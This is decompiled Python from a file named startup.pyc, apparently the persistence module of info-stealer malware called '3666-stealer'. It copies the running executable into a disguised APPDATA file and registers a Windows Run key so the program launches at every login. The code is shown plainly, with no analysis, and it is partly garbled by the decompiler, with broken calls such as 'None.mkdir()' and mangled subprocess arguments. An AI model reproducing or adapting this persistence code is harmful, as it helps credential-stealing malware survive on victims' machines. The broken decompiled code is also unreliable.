# Source Generated with Decompyle++
# File: startup.pyc (Python 3.10)

import subprocess
import os
import shutil
import sys

class Startup:
    
    def __init__(self = None):
        self.working_dir = os.getenv('APPDATA') + '\\3666-stealer'
        if self.check_self():
            return None
        None.mkdir()
        self.write_stub()
        self.regedit()

    
    def check_self(self = None):
        if os.path.realpath(sys.executable) == self.working_dir + '\\dat.txt':
            return True

    
    def mkdir(self = None):
        if not os.path.isdir(self.working_dir):
            os.mkdir(self.working_dir)
            return None
        None.rmtree(self.working_dir)
        os.mkdir(self.working_dir)

    
    def write_stub(self = None):
        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + '\\dat.txt')
    # WARNING: Decompyle incomplete

    
    def regedit(self = None):
        subprocess.run([
            'reg',
            'delete',
            'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            '/v',
            '3666-stealer',
            '/f'], True, **('args', 'shell'))
        subprocess.run([
            'reg',
            'add',
            'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            '/v',
            '3666-stealer',
            '/t',
            'REG_SZ',
            '/d',
            f'''{self.working_dir}\\run.bat''',
            '/f'], True, **('args', 'shell'))


